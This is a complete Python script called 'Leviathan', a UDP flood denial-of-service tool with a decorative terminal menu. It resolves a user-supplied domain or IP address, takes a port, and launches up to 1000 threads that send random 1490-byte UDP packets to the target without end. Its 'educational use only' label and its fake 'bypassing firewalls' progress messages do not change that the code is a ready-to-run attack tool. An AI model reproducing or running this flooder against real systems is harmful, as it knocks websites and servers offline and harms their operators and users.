import os
import sys
import time
import socket
import random
import threading
from platform import system

# --- ADVANCED COLOR SCHEME ---
W = '\033[1;37m'  # White Bold
G = '\033[1;32m'  # Green Bold
R = '\033[1;31m'  # Red Bold
Y = '\033[1;33m'  # Yellow Bold
B = '\033[1;34m'  # Blue Bold
C = '\033[1;36m'  # Cyan Bold
M = '\033[1;35m'  # Magenta Bold
RE = '\033[0m'    # Reset

# Background Highlights
HG = '\033[1;42;30m' 
HR = '\033[1;41;37m' 
HB = '\033[1;44;37m' 

def clear():
    os.system('cls' if system() == "Windows" else 'clear')

def typing_effect(text, speed=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def banner():
    clear()
    # Unique Leviathan Aesthetic Banner
    print(f"""{C}
    ▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚
    {B}██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗
    ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║
    ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║
    ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║
    ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║
    ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
    {C}▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚
    {W} 🔱 {HB} STABILITY: v2.0 {RE} 🔱 {HG} CORE: MULTI-THREAD {RE} 🔱 {HB} DEPLOY: LVT-2025 {RE}
    {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RE}""")

def advanced_loading():
    clear()
    banner()
    print(f"\n{B}[*] {W}INITIALIZING LEVIATHAN QUANTUM ENGINE...")
    tasks = ["CONNECTING TO PROTOCOLS", "GENERATING UDP PAYLOADS", "BYPASSING FIREWALLS", "STABILIZING THREADS"]
    
    for task in tasks:
        sys.stdout.write(f"\r{Y}[~] {W}{task.ljust(30)} {G}")
        for _ in range(3):
            sys.stdout.write(".")
            sys.stdout.flush()
            time.sleep(0.4)
    
    print(f"\n\n{G}██████████████████████████████████████████████████ 100%")
    print(f"\n{HG}  ENGINE READY: SYSTEM ONLINE  {RE}")
    time.sleep(1)

# --- ATTACK ENGINE ---
sent_packets = 0
def start_strike(ip, port, packet_data):
    global sent_packets
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(packet_data, (ip, port))
            sent_packets += 1
            # Advanced Scrolling Output
            sys.stdout.write(f"\r{C}[L-STRIKE]{RE} {W}Target:{R}{ip}{W} {B}Port:{Y}{port}{W} {G}Packets:{M}{sent_packets}{RE}")
            sys.stdout.flush()
        except:
            pass

# --- UI FLOW ---
advanced_loading()

while True:
    banner()
    print(f"\n{G}┌─[ {W}SELECT OPERATION{G} ]")
    print(f"{G}│")
    print(f"{G}├── {W}[{C}01{W}] {G}DOMAIN STRIKE  {W}(Website Target)")
    print(f"{G}├── {W}[{C}02{W}] {G}IP ADDRESS     {W}(Server Target)")
    print(f"{G}├── {W}[{C}03{W}] {G}ABOUT CORE     {W}(Information)")
    print(f"{G}└── {W}[{C}00{W}] {R}TERMINATE      {W}(Close System)")
    
    choice = input(f"\n{C}Leviathan@Terminal{W}:~$ {Y}").strip()

    if choice in ['1', '01']:
        domain = input(f"\n{B}┌──[ {W}TARGET URL {B}]\n└──> {Y}").strip()
        try:
            target_ip = socket.gethostbyname(domain)
            break
        except:
            print(f"{R}[!] ERROR: UNABLE TO RESOLVE DOMAIN{RE}")
            time.sleep(2)
    elif choice in ['2', '02']:
        target_ip = input(f"\n{B}┌──[ {W}TARGET IP {B}]\n└──> {Y}").strip()
        break
    elif choice in ['3', '03']:
        banner()
        print(f"\n{HB}  SYSTEM INFORMATION  {RE}")
        typing_effect(f"{W}DEVELOPER: {C}LEVIATHAN")
        typing_effect(f"{W}NETWORK  : {G}UDP FLOOD ENGINE")
        typing_effect(f"{W}LEGAL    : {R}EDUCATIONAL USE ONLY")
        input(f"\n{Y}Press Enter to Return...")
    elif choice in ['0', '00']:
        sys.exit()
    else:
        print(f"{R}[!] INVALID ACCESS CODE{RE}")
        time.sleep(1)

# CONFIGURATION
banner()
print(f"\n{C}[+] {W}TARGET LOCKED: {G}{target_ip}")
port_in = input(f"{C}[?] {W}ASSIGN PORT (Press Enter for Random): {Y}").strip()
port = int(port_in) if port_in else 80

threads = input(f"{C}[?] {W}THREADS POWER (Recommend 1000): {Y}").strip()
threads = int(threads) if threads else 1000

payload = random._urandom(1490)

# START ANIMATION
print(f"\n{HR}  SYSTEM LAUNCHING IN 3 SECONDS...  {RE}")
time.sleep(3)
clear()
banner()

# MULTI-THREADING LAUNCH
for i in range(threads):
    strike_thread = threading.Thread(target=start_strike, args=(target_ip, port, payload))
    strike_thread.daemon = True
    strike_thread.start()

try:
    while True:
        # প্যাকেট কাউন্ট আপডেট করার জন্য মেইন লুপ সচল রাখা
        time.sleep(0.1)
except KeyboardInterrupt:
    print(f"\n\n{HR}  OPERATION HALTED BY USER  {RE}")
    print(f"{G}[✔] TOTAL DATA SHOT: {sent_packets} Packets{RE}")
    sys.exit()
